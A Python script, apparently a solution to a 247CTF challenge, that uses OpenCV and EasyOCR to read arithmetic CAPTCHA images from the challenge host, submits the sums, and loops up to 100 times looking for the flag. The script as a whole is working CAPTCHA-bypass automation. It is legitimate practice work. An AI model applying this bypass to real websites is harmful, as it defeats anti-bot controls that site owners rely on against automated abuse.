#!/usr/bin/env python3
import easyocr
import cv2
import numpy as np
import requests
import re
import time

BASE_URL = "https://087ba594e710a16e.247ctf.com/"

print("Inicializando EasyOCR...")
reader = easyocr.Reader(['en'], gpu=False, verbose=False)
print("Listo\n")

def solve_one(session, reader):
    """Resuelve un CAPTCHA"""
    try:
        # GET / para inicializar
        session.get(BASE_URL)
        
        # GET mturk.php
        img_response = session.get(BASE_URL + "mturk.php")
        nparr = np.frombuffer(img_response.content, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        
        # Preprocesar
        _, thresh = cv2.threshold(img, 130, 255, cv2.THRESH_BINARY_INV)
        mega = cv2.resize(thresh, (img.shape[1]*10, img.shape[0]*10), interpolation=cv2.INTER_CUBIC)
        
        # OCR
        result = reader.readtext(mega, allowlist='0123456789+=')
        
        # Ordenar por posición X
        sorted_result = sorted(result, key=lambda x: x[0][0][0])
        ordered_text = ''.join([text for (_, text, _) in sorted_result])
        
        # Buscar patrón A+B
        match = re.search(r'(\d+)\+(\d+)', ordered_text)
        if match:
            a = int(match.group(1))
            b = int(match.group(2))
            answer = a + b
            
            # Enviar en la MISMA sesión
            data = {"captcha": str(answer)}
            response = session.post(BASE_URL, data=data)
            
            return True, answer, response.text
        
        return False, None, "No se encontró patrón"
    except Exception as e:
        return False, None, str(e)

# Resolver 100 CAPTCHAs
session = requests.Session()
start_time = time.time()
solved = 0

for i in range(100):
    success, answer, response_text = solve_one(session, reader)
    
    if success:
        # Verificar si fue correcto
        if "invalid" not in response_text.lower():
            solved += 1
            
            # Buscar flag
            if "flag" in response_text.lower() or "247ctf{" in response_text.lower():
                print(f"\n{'='*60}")
                print(f"¡FLAG ENCONTRADA después de {solved} intentos correctos!")
                print(f"{'='*60}\n")
                
                flag_match = re.search(r'247CTF\{[^}]+\}', response_text, re.IGNORECASE)
                if flag_match:
                    print(flag_match.group(0))
                else:
                    # Buscar en todo el HTML
                    print(response_text[:2000])
                break
            
            if solved % 10 == 0:
                elapsed = time.time() - start_time
                print(f"{solved}/100 resueltos en {elapsed:.1f}s (promedio: {elapsed/solved:.2f}s/captcha)")
        
        elif "timeout" in response_text.lower() or "slow" in response_text.lower():
            print(f"\nTimeout después de {solved} resueltos en {time.time()-start_time:.1f}s")
            break
        else:
            print(f"{i+1}. Respuesta {answer} marcada como incorrecta")
    else:
        print(f"{i+1}. Error: {response_text[:50]}")

elapsed = time.time() - start_time
print(f"\nTotal: {solved}/100 en {elapsed:.1f}s")
